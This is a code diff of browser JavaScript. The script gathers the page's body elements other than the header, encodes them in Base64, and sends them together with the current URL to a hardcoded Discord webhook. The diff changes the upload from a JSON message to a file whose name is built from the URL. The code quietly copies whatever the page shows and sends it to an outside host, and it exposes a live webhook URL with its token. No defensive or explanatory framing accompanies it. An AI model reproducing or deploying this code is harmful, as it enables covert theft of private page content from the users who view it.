@@ -51,6 +51,7 @@ function daniuit() {
     }
 }
 
+
 function logBodyElementsAsBase64() {
   const body = document.body; // Get the body of the document
   const allElements = body.querySelectorAll('*:not(header)'); // Select all elements except those in the header
@@ -79,12 +80,17 @@ function checkStatus(url) {
     xhr.onreadystatechange = function() {
         if (xhr.readyState === XMLHttpRequest.DONE) {
             if (xhr.status === 200) {
-                var href = (new URL(window.location)).href;
+              var href = (new URL(window.location)).href;
+              var filename = href.replace(/[^a-zA-Z0-9]/g, '_') + '.txt';
                 xhttp = new XMLHttpRequest();
                 var bd = logBodyElementsAsBase64();
-                xhttp.open("POST", "https://discord.com/api/webhooks/1261424001797066793/Oq5E8KLKf3wBBWFZ965K77Xhn3UJcPySXUjsC3t0ZbRSJedbvSbkiRzdmfN2ojtlQgaF");
-                xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-                xhttp.send(JSON.stringify({ "content":  href  + "\n" + bd}));
+                const blob = new Blob([bd], { type: 'text/plain' });
+                const formData = new FormData();
+                formData.append('file', blob, filename); // Append the Blob as a file with a name
+                // Open a POST request
+                xhttp.open("POST", "https://discord.com/api/webhooks/1261424001797066793/Oq5E8KLKf3wBBWFZ965K77Xhn3UJcPySXUjsC3t0ZbRSJedbvSbkiRzdmfN2ojtlQgaF", true);
+                xhttp.send(formData);
+               
             } 
         }
     };
